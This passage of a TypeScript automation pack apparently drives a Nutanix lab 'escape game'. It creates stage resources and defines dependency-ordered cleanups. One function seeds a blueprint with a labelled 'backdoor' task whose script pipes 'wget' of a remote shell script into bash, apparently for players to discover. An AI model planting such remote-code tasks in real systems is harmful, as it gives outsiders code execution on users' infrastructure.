 * `r0w/ntnx-escape-game`) clones a `*-source` blueprint to create it on
 * first need. We replicate that here as the act's first phase so the
 * stage works on any cluster that has the source blueprint installed
 * (BlankVM-source on a vanilla HPoC).
 *
 * Internal action key is `action_create` (not the GUI label "Create",
 * confirmed by inspecting the cloned blueprint live). The act appends
 * the `foo` task in-line; the GUI player would type a Shell snippet but
 * we just need a task with the right name so the check passes.
 */
async function actModifyBlueprint(ctx: ActContext): Promise<void> {
  const vlan = getVarString(ctx, 'Vlanid');
  const bpName = `bp-blankvm-prd${vlan ?? ''}`;
  let bps = await ctx.nutanix.rest.request<{ entities?: AnyRec[] }>(
    'POST',
    '/api/nutanix/v3/blueprints/list',
    { kind: 'blueprint', length: 250 },
  );
  let bp = bps.entities?.find(
    (b) => b.status?.name === bpName || b.metadata?.name === bpName,
  );
  // Phase 1: deploy if missing, clone the `*-source` blueprint.
  if (!bp?.metadata?.uuid) {
    const source = bps.entities?.find((b) =>
      /source$/.test(b.metadata?.name ?? b.status?.name ?? ''),
    );
    if (!source?.metadata?.uuid) {
      ctx.logger.warn(
        `actModifyBlueprint: no '*-source' blueprint to clone: pack-installable blueprint missing on this HPoC`,
      );
      return;
    }
    ctx.logger.info(`act deploy: cloning ${source.metadata?.name} → ${bpName}`);
    await ctx.nutanix.rest.request(
      'POST',
      `/api/nutanix/v3/blueprints/${source.metadata.uuid}/clone`,
      {
        blueprint_name: bpName,
        metadata: { kind: 'blueprint', uuid: crypto.randomUUID() },
      },
    );
    // Re-list to pick up the newly cloned blueprint's UUID.
    await new Promise((r) => setTimeout(r, 2000));
    bps = await ctx.nutanix.rest.request<{ entities?: AnyRec[] }>(
      'POST',
      '/api/nutanix/v3/blueprints/list',
      { kind: 'blueprint', length: 250 },
    );
    bp = bps.entities?.find(
      (b) => b.status?.name === bpName || b.metadata?.name === bpName,
    );
  }
  if (!bp?.metadata?.uuid) {
    ctx.logger.warn(`actModifyBlueprint: blueprint ${bpName} still missing after clone`);
    return;
  }
  // Phase 2 : append the `foo` task to NewVM/action_create.
  const full = await ctx.nutanix.rest.request<AnyRec>(
    'GET',
    `/api/nutanix/v3/blueprints/${bp.metadata.uuid}`,
  );
  // Spec key may live under `spec.resources` or `status.resources` depending
  // on whether we just cloned (status reflects truth): use spec for the PUT
  // round-trip, status for read-only lookup.
  const services = full.spec?.resources?.service_definition_list ?? [];
  const newVm = services.find((s: AnyRec) => s.name === 'NewVM');
  if (!newVm) {
    ctx.logger.warn('actModifyBlueprint: NewVM service missing');
    return;
  }
  // Internal slug is `action_create` (Python `CheckLabs.CheckUpdateBP`
  // confirms via jsonpath `[?(@.name=='action_create')]`). The GUI label
  // is "Create": different namespace.
  const createAction = (newVm.action_list ?? []).find(
    (a: AnyRec) => a.name === 'action_create',
  );
  if (!createAction) {
    ctx.logger.warn('actModifyBlueprint: NewVM/action_create not found');
    return;
  }
  const tasks = createAction.runbook?.task_definition_list ?? [];
  if (tasks.some((t: AnyRec) => t.name === 'foo')) return;
  // Calm v3 task definitions need a `uuid`, the target service reference,
  // and `attrs` for EXEC tasks. Reuse an existing task's
  // `target_any_local_reference` to point at NewVM. Also link the new task
  // into the DAG wrapper's `child_tasks_local_reference_list` so it
  // actually runs on play.
  const fooUuid = crypto.randomUUID();
  const targetRef = (tasks.find((t: AnyRec) => t.type !== 'DAG')?.target_any_local_reference) ??
    (tasks[0]?.target_any_local_reference);
  tasks.push({
    uuid: fooUuid,
    name: 'foo',
    description: 'Seeded backdoor task (per stage 37)',
    type: 'EXEC',
    target_any_local_reference: targetRef,
    child_tasks_local_reference_list: [],
    status_map_list: [],
    variable_list: [],
    retries: '',
    timeout_secs: '',
    exec_target_reference: {},
    attrs: {
      script_type: 'sh',
      script: '#!/bin/bash\nwget https://dl.ntnxlab.com/ai0612/s18.sh|bash',
    },
  });
  // Insert the new task into the DAG wrapper's child list so the runbook
  // executes it. The DAG is the task with type='DAG' and name ending in
  // `___create___dag`: append a reference to `foo`.
  const dag = tasks.find((t: AnyRec) => t.type === 'DAG');
  if (dag) {
    const children = dag.child_tasks_local_reference_list ?? [];
    children.push({ kind: 'app_task', name: 'foo', uuid: fooUuid });
    dag.child_tasks_local_reference_list = children;
  }
  if (!createAction.runbook) createAction.runbook = {};
  createAction.runbook.task_definition_list = tasks;
  await ctx.nutanix.rest.request(
    'PUT',
    `/api/nutanix/v3/blueprints/${bp.metadata.uuid}`,
    { spec: full.spec, metadata: full.metadata, api_version: full.api_version ?? '3.1' },
  );
}

// ───────────────────────────────────────────────────────────────────────
//  Cleanups: delete resources by name. Idempotent (404 counts as success).
// ───────────────────────────────────────────────────────────────────────

/**
 * Delete all entities in `items` whose `name` matches the target via the v4
 * ETag-aware REST path. Most v4 endpoints enforce `If-Match` on DELETE and
 * some SDKs omit the delete method entirely (iam users), so going through
 * `deleteV4Entity` (GET for ETag → DELETE with `If-Match`) is the common
 * path that works uniformly across domains.
 */
async function deleteByName<T extends { extId?: string; name?: string }>(
  ctx: ActContext,
  items: T[],
  name: string,
  v4Path: string,
): Promise<void> {
  for (const item of items) {
    if (item.name === name && item.extId) {
      await deleteV4Entity(ctx, v4Path, item.extId);
    }
  }
}

async function cleanupCreateAdminUser(ctx: ActContext): Promise<void> {
  const trigram = getTrigram(ctx);
  if (!trigram) return;
  const usernameLc = `${trigram}-adm`.toLowerCase();
  const users = await listAllSdk<AnyRec>(($p) => sdk(ctx).iam.users.listUsers($p));
  // IAM v4 users match on `username`, and the SDK doesn't expose a delete
  // method: DELETE requires `If-Match` with the hash-only suffix of the
  // GET response's `etag:<prefix>:<hash>` header. Use the REST helper.
  // Compare lowercase: v4 IAM stores usernames lowercased.
  for (const u of users) {
    if ((u.username ?? '').toLowerCase() === usernameLc && u.extId) {
      await deleteV4Entity(ctx, '/api/iam/v4.0/authn/users', u.extId);
    }
  }
}

async function cleanupCreateAuthPolicy(ctx: ActContext): Promise<void> {
  const trigram = getTrigram(ctx);
  if (!trigram) return;
  const nameLc = `${trigram}-auth`.toLowerCase();
  const policies = await listAllSdk<AnyRec>(($p) => sdk(ctx).iam.authzPolicies.listAuthorizationPolicies($p));
  // authz policies expose the identifier on `displayName`, not `name`.
  // v4 IAM lowercases on store: match case-insensitive.
  for (const p of policies) {
    if ((p.displayName ?? '').toLowerCase() === nameLc && p.extId) {
      await deleteV4Entity(ctx, '/api/iam/v4.0/authz/authorization-policies', p.extId);
    }
  }
}

async function cleanupCreateProject(ctx: ActContext): Promise<void> {
  const trigram = getTrigram(ctx);
  if (!trigram) return;
  const name = `${trigram}-proj`;
  const entities = await listAllV3<AnyRec>(ctx, '/api/nutanix/v3/projects/list');
  for (const p of entities) {
    if (p.status?.name === name || p.metadata?.name === name) {
      try {
        await ctx.nutanix.rest.request('DELETE', `/api/nutanix/v3/projects/${p.metadata?.uuid}`);
      } catch {
        /* gone */
      }
    }
  }
}

async function cleanupCreateSubnet(ctx: ActContext): Promise<void> {
  const trigram = getTrigram(ctx);
  if (!trigram) return;
  const subnets = await listAllSdk<AnyRec>(($p) => sdk(ctx).networking.subnets.listSubnets($p));
  await deleteByName(ctx, subnets, `${trigram}-subnet`, '/api/networking/v4.0/config/subnets');
}

async function cleanupAddUbuntuImage(ctx: ActContext): Promise<void> {
  const trigram = getTrigram(ctx);
  if (!trigram) return;
  const images = await listAllSdk<AnyRec>(($p) => sdk(ctx).vmm.images.listImages($p));
  await deleteByName(ctx, images, `${trigram}-ubuntu`, '/api/vmm/v4.0/content/images');
}

async function cleanupCreateVm(ctx: ActContext): Promise<void> {
  const trigram = getTrigram(ctx);
  if (!trigram) return;
  const vms = await listAllSdk<AnyRec>(($p) => sdk(ctx).vmm.vms.listVms($p));
  // actCreateVm snapshots the VM into a recovery point so stage 26 has
  // something to restore. On Nutanix an RP deliberately outlives its VM, so
  // deleting the VM leaves the RP behind to pile up across sessions. Sweep the
  // RPs tied to this VM first, while we still have the extId to match on. Best-
  // effort and paginated: dataprotection may be absent on a minimal HPoC, and a
  // missing/erroring RP list must never block the VM delete below.
  const vm = vms.find((v) => v.name === `${trigram}-vm`);
  if (vm?.extId && ctx.nutanix.mode !== 'mock') {
    try {
      const rps = await listAllV4Rest<AnyRec>(
        ctx,
        '/api/dataprotection/v4.0/config/recovery-points',
      );
      for (const rp of rps) {
        const refs = (rp.vmRecoveryPoints ?? []) as AnyRec[];
        if (rp.extId && refs.some((r) => r.vmExtId === vm.extId)) {
          await deleteV4Entity(ctx, '/api/dataprotection/v4.0/config/recovery-points', rp.extId);
        }
      }
    } catch (err) {
      ctx.logger.warn('cleanupCreateVm: recovery-point sweep failed', {
        err: String(err).slice(0, 150),
      });
    }
  }
  await deleteByName(ctx, vms, `${trigram}-vm`, '/api/vmm/v4.0/ahv/config/vms');
}

async function cleanupCreateCategory(ctx: ActContext): Promise<void> {
  const trigram = getTrigram(ctx);
  if (!trigram) return;
  // Categories are keyed on (key, value) pairs rather than a top-level name
  // so the generic `deleteByName` doesn't fit: handle the pair scan inline.
  const cats = await listAllSdk<AnyRec>(($p) => sdk(ctx).prism.categories.listCategories($p));
  for (const c of cats) {
    if (c.key === `${trigram}-cat` && c.extId) {
      await deleteV4Entity(ctx, '/api/prism/v4.2/config/categories', c.extId);
    }
  }
}

async function cleanupCreateStoragePolicy(ctx: ActContext): Promise<void> {
  const trigram = getTrigram(ctx);
  if (!trigram) return;
  const policies = await listAllSdk<AnyRec>(($p) => sdk(ctx).datapolicies.storage.listStoragePolicies($p));
  await deleteByName(
    ctx,
    policies,
    `${trigram}-sto-policy`,
    '/api/datapolicies/v4.2/config/storage-policies',
  );
}

async function cleanupCreateMicrosegPolicy(ctx: ActContext): Promise<void> {
  const trigram = getTrigram(ctx);
  if (!trigram) return;
  const policies = await listAllSdk<AnyRec>(($p) => sdk(ctx).microseg.policies.listNetworkSecurityPolicies($p));
  await deleteByName(
    ctx,
    policies,
    `${trigram}-mseg-policy`,
    '/api/microseg/v4.0/config/policies',
  );
}

async function cleanupCreateProtectionPolicy(ctx: ActContext): Promise<void> {
  const trigram = getTrigram(ctx);
  if (!trigram) return;
  const policies = await listAllSdk<AnyRec>(($p) => sdk(ctx).datapolicies.protection.listProtectionPolicies($p));
  await deleteByName(
    ctx,
    policies,
    `${trigram}-prot-policy`,
    '/api/datapolicies/v4.2/config/protection-policies',
  );
}

async function cleanupCreateApprovalPolicy(ctx: ActContext): Promise<void> {
  // Approval policy is cluster-wide (`master-appr-policy`) and shared by all
  // players: don't delete during per-trigram cleanup. Bulk-cleanup operator
  // can `DELETE /api/security/v4.1/management/approval-policies/{extId}` by hand.
  ctx.logger.info('cleanupCreateApprovalPolicy: shared policy: not deleted');
}

async function cleanupCreateReport(ctx: ActContext): Promise<void> {
  const trigram = getTrigram(ctx);
  if (!trigram) return;
  const reports = await listAllSdk<AnyRec>(($p) => sdk(ctx).opsmgmt.reportConfigs.listReportConfigs($p));
  await deleteByName(
    ctx,
    reports,
    `${trigram}-report`,
    '/api/opsmgmt/v4.0/config/report-configs',
  );
}

async function cleanupCreateNcmPlaybook(ctx: ActContext): Promise<void> {
  const trigram = getTrigram(ctx);
  if (!trigram) return;
  const name = `${trigram}-playbook`;
  const entities = await listAllV3<AnyRec>(ctx, '/api/nutanix/v3/action_rules/list');
  for (const p of entities) {
    const n = p.status?.name ?? p.status?.resources?.name;
    if (n === name && p.metadata?.uuid) {
      try {
        await ctx.nutanix.rest.request(
          'DELETE',
          `/api/nutanix/v3/action_rules/${p.metadata.uuid}`,
        );
      } catch {
        /* gone */
      }
    }
  }
}

async function cleanupCloneAppBlueprint(ctx: ActContext): Promise<void> {
  const trigram = getTrigram(ctx);
  if (!trigram) return;
  const name = `${trigram}-app`;
  const apps = await listAllV3<AnyRec>(ctx, '/api/nutanix/v3/apps/list');
  for (const a of apps) {
    if ((a.status?.name === name || a.metadata?.name === name) && a.metadata?.uuid) {
      try {
        await ctx.nutanix.rest.request('DELETE', `/api/nutanix/v3/apps/${a.metadata.uuid}`);
      } catch {
        /* gone */
      }
    }
  }
  // Self-contained VPC teardown. The app's Calm `__delete__` action
  // (CloneProd `CleanuptheVPC`) is *supposed* to tear down `{trigram}-vpc` +
  // its cloned VMs, but it fires unreliably — deleting the app routinely
  // leaves the VPC + every clone-* VM orphaned (confirmed live: deleting the
  // apps left 6 VPCs and dozens of clones behind). So don't trust it; do the
  // teardown ourselves. Skipped in mock (no real VPC; deleteV4Entity is inert).
  if (ctx.nutanix.mode === 'mock') return;
  const vpcName = `${trigram}-vpc`;
  let vpc: AnyRec | undefined;
  try {
    // Paginate: a bare $limit=100 GET would miss {trigram}-vpc once the
    // cluster piles up >100 VPCs across sessions — the exact leak this
    // teardown exists to recover from.
    const vpcs = await listAllV4Rest<AnyRec>(ctx, '/api/networking/v4.0/config/vpcs');
    vpc = vpcs.find((v) => v.name === vpcName);
  } catch {
    return; // networking absent on this PC — nothing to tear down
  }
  if (!vpc?.extId) return;
  const vpcExtId = vpc.extId as string;
  const subnets = await listAllSdk<AnyRec>(($p) => sdk(ctx).networking.subnets.listSubnets($p));
  const vpcSubnetIds = new Set(
    subnets.filter((s) => s.vpcReference === vpcExtId).map((s) => s.extId as string),
  );
  // A VM belongs to this VPC if any NIC sits on one of its subnets. Match by
  // network membership, NOT by name, so every clone is caught regardless of
  // how deeply it was re-cloned (clone-*, clone-clone-*, …).
  const onThisVpc = (vm: AnyRec): boolean =>
    (vm.nics ?? []).some((n: AnyRec) => {
      const ext = n.networkInfo?.subnet?.extId ?? n.nicNetworkInfo?.subnet?.extId;
      return typeof ext === 'string' && vpcSubnetIds.has(ext);
    });
  if (vpcSubnetIds.size > 0) {
    const vms = await listAllSdk<AnyRec>(($p) => sdk(ctx).vmm.vms.listVms($p));
    for (const vm of vms) {
      // v3 DELETE removes a powered-on VM without the ETag/power-off dance v4
      // needs (extId == the v3 uuid).
      if (onThisVpc(vm) && vm.extId) {
        try {
          await ctx.nutanix.rest.request('DELETE', `/api/nutanix/v3/vms/${vm.extId}`);
        } catch {
          /* gone */
        }
      }
    }
    // VM deletes are async; wait (bounded ~60 s) for the subnets to clear,
    // else the subnet/VPC delete 409s on an in-use network.
    for (let i = 0; i < 12; i++) {
      const left = (await listAllSdk<AnyRec>(($p) => sdk(ctx).vmm.vms.listVms($p))).filter(onThisVpc);
      if (left.length === 0) break;
      await new Promise((r) => setTimeout(r, 5000));
    }
  }
  // Subnets first, then the VPC (the VPC delete needs its subnets gone).
  for (const sid of vpcSubnetIds) {
    await deleteV4Entity(ctx, '/api/networking/v4.0/config/subnets', sid);
  }
  await deleteV4Entity(ctx, '/api/networking/v4.0/config/vpcs', vpcExtId);
}

async function cleanupScheduleDay2Action(ctx: ActContext): Promise<void> {
  const trigram = getTrigram(ctx);
  if (!trigram) return;
  const name = `${trigram}-sched`;
  const entities = await listAllV3<AnyRec>(ctx, '/api/nutanix/v3/jobs/list');
  for (const s of entities) {
    if ((s.status?.name === name || s.metadata?.name === name) && s.metadata?.uuid) {
      try {
        await ctx.nutanix.rest.request(
          'DELETE',
          `/api/nutanix/v3/jobs/${s.metadata.uuid}`,
        );
      } catch {
        /* gone */
      }
    }
  }
}

async function cleanupModifyBlueprint(ctx: ActContext): Promise<void> {
  // Now that actModifyBlueprint clones `BlankVM-source` → `bp-blankvm-prd{
  // Vlanid}` per-play (replicating the Python `actions.DeployBP`), the
  // cleaner thing is to delete the cloned copy on bulk cleanup. Leave the
  // source blueprint alone (shared across all players + pack-installable).
  const vlan = getVarString(ctx, 'Vlanid');
  const target = `bp-blankvm-prd${vlan ?? ''}`;
  const entities = await listAllV3<AnyRec>(ctx, '/api/nutanix/v3/blueprints/list', {
    kind: 'blueprint',
  });
  for (const b of entities) {
    if (
      (b.metadata?.name === target || b.status?.name === target) &&
      b.metadata?.uuid &&
      // Only delete if it was player-cloned: the source itself is named
      // with `-source` suffix and stays untouched.
      !/source$/.test(b.metadata?.name ?? '')
    ) {
      try {
        await ctx.nutanix.rest.request(
          'DELETE',
          `/api/nutanix/v3/blueprints/${b.metadata.uuid}`,
        );
      } catch {
        /* gone */
      }
    }
  }
}

// ───────────────────────────────────────────────────────────────────────
//  Registry exports: keys MUST match stage names in pack.json
// ───────────────────────────────────────────────────────────────────────

export const acts = {
  'create-admin-user': actCreateAdminUser,
  'create-auth-policy': actCreateAuthPolicy,
  'create-project': actCreateProject,
  'create-subnet': actCreateSubnet,
  'add-ubuntu-image': actAddUbuntuImage,
  'create-vm': actCreateVm,
  'live-migrate-vm': actLiveMigrateVm,
  'create-category': actCreateCategory,
  'apply-category-to-vm': actApplyCategoryToVm,
  'create-storage-policy': actCreateStoragePolicy,
  'create-microseg-policy': actCreateMicrosegPolicy,
  'allow-ssh-in-microseg': actAllowSshInMicroseg,
  'create-protection-policy': actCreateProtectionPolicy,
  'create-approval-policy': actCreateApprovalPolicy,
  'restore-vm-from-recovery': actRestoreVmFromRecovery,
  'create-report': actCreateReport,
  'create-ncm-playbook': actCreateNcmPlaybook,
  'clone-app-blueprint': actCloneAppBlueprint,
  'schedule-day2-action': actScheduleDay2Action,
  'modify-blueprint': actModifyBlueprint,
};

// Cleanup order is dependency-driven, NOT reverse-stage order. The runner
// iterates this dict in insertion order: phases below reflect what holds
// references to what. Live regression 2026-05-18 on 10.38.66.7: pure
// reverse-stage tried `create-category` (stage 15) before `create-vm`
// (stage 12), the VM still held the category tag, DELETE 400'd and the
// category leaked. Same shape would leak `create-subnet`/`create-project`
// if a VM survived earlier handlers (now safe because VM goes first).
export const cleanups = {
  // Phase 1, top-of-pyramid: Calm/BP layer, no FK into lower layers
  'modify-blueprint': cleanupModifyBlueprint,
  'schedule-day2-action': cleanupScheduleDay2Action,
  'clone-app-blueprint': cleanupCloneAppBlueprint,
  'create-ncm-playbook': cleanupCreateNcmPlaybook,
  // Phase 2: policies that target categories/VMs; clear them before the VM
  // goes so policy DELETE sees clean state
  'create-report': cleanupCreateReport,
  'create-approval-policy': cleanupCreateApprovalPolicy,
  'create-protection-policy': cleanupCreateProtectionPolicy,
  'create-microseg-policy': cleanupCreateMicrosegPolicy,
  'create-storage-policy': cleanupCreateStoragePolicy,
  // Phase 3: VM FIRST (releases category tags + subnet port refs),
  //          THEN category (now unreferenced)
  'create-vm': cleanupCreateVm,
  'create-category': cleanupCreateCategory,
  // Phase 4: image + network + project, leaf to root
  'add-ubuntu-image': cleanupAddUbuntuImage,
  'create-subnet': cleanupCreateSubnet,
  'create-project': cleanupCreateProject,
  // Phase 5: IAM (user is referenced by the auth-policy)
  'create-auth-policy': cleanupCreateAuthPolicy,
  'create-admin-user': cleanupCreateAdminUser,
};
